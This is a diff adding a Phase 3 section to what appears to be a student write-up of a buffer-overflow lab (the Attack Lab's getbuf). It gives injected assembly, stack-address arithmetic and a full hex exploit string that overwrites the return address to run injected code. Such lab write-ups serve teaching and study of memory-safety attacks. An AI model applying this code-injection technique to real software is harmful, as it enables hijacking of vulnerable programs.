@@ -83,3 +83,26 @@ Breakpoint 2, getbuf () at buf.c:16
 ```
 Here, we specify the jump address to be the address of rsp, which is also the address of the byte code we enter above. So the return address of getbuf will be changed. Then we accomplish the injection. 
 
+## Phase 3
+In phase3, we pass the address of the string as the argument. We can construct the solution based on phase2. Rather than moving the cookie directly in the assembly code, we pass the address of cookie this time. 
+
+``` asm
+movq $0x5561dca8, %rdi
+pushq $0x4018fa
+retq
+```
+Then we briefly talk about this constant. 0x5561dca8 = 0x5561dc78 + 0x30, where 0x5561dc78 is what we use in the phase 2(rsp). We use this 0x30 because of our structure of the final solution. We put the cookie string at the end of the byte code. To be more specific, 
+
+```
+48 c7 c7 a8 dc 61 55 68
+fa 18 40 00 c3 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+78 dc 61 55 00 00 00 00 
+35 39 62 39 39 37 66 61
+00
+
+```
+35 39 62 39 39 37 66 61 is the ascii byte code of our cookie string, and 00 is the sign used in C to indicate the end of a string. The other part is similar to what we talk about in phase2. 
+
